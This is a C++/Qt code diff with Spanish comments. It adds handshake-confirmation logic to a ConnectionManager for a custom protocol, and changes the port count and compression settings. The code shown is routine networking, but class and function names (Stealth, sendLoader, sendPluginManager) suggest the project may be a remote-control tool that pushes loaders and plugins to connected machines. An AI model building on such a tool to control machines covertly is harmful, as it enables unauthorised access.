@@ -8,6 +8,7 @@ ConnectionManager::ConnectionManager(Stealth* stealth,MessageManager* mngMessage
     connect(this,SIGNAL(connectionEstablished(Connection*)),this,SLOT(addConnection(Connection*)));
     connect(mngMessage,SIGNAL(receivedHandshake(Connection*)),this,SLOT(processHandshake(Connection*)));
     connect(mngMessage,SIGNAL(receivedLoaderOk(Connection*)),this,SLOT(sendPluginManager(Connection*)));
+    connect(mngMessage,SIGNAL(receivedHanshakeOk(Connection*)),this,SLOT(checkHandshakeOk(Connection*)));
 }
 
 void ConnectionManager::sendLoader(Connection *connection)
@@ -101,13 +102,13 @@ void ConnectionManager::processHandshake(Connection* connection)
     Connection::RPEP_CLIENT_HANDSHAKE* ClientHandShake;
 
     //FIXME: Definir número de puertos correcto
-#define NUM_PORTS 1
+#define NUM_PORTS 0
 
     ClientHandShake=(Connection::RPEP_CLIENT_HANDSHAKE*)malloc(sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS);
 
-    ClientHandShake->CompressionALGM=connection->HandShake.SupportedCompressionAlgm[0];
+    ClientHandShake->CompressionALGM=0;
     ClientHandShake->MaxBlockSize=connection->HandShake.MaxBlockSize;
-    ClientHandShake->Port[0]=2000;
+    //ClientHandShake->Port[0]=2000;
     ClientHandShake->PortCount=NUM_PORTS;
     ClientHandShake->Version.High=1;
     ClientHandShake->Version.Low=0;
@@ -130,7 +131,30 @@ void ConnectionManager::processHandshake(Connection* connection)
     free(ClientHandShake);
     free(opType);
 
-     qDebug("Handshake enviado");
+    qDebug("Handshake enviado");
+
+    qDebug("Esperando confirmación de HandShake");
+
+    connection->setState(Connection::WaitingGreetingOk);
+}
+
+void ConnectionManager::checkHandshakeOk(Connection* connection)
+{
+    if(connection->getState()!=Connection::ReadingGreetingOk) return;
+    if(connection->Data.size()!=connection->NextBlockHeader.Size.Bytes) return;
+
+    Connection::RPEP_ERROR ok=*(Connection::RPEP_ERROR*)connection->Data.data();
+
+    if(ok.Code!=0 && ok.Code!=-1)
+    {
+        qWarning("Confirmacion de Handshake invalida");
+        return;
+    }
+    else if(ok.Code==-1)
+    {
+        qWarning()<<"Confirmación de Hanshake errónea, el pluginmanager no soporta el handshake enviado";
+        return;
+    }
 
     connection->setState(Connection::Ready);
     emit connectionReady(connection);
@@ -155,8 +179,6 @@ void ConnectionManager::connectionError(QAbstractSocket::SocketError)
 {
     /* TODO: Hacer que si hay un error en la conexión cuando la conexión ya
              está añadida a la GUI, se elimine el item del TreeView */
-
-
 
     Connection* connection=qobject_cast<Connection*>(sender());
     connection->deleteLater();
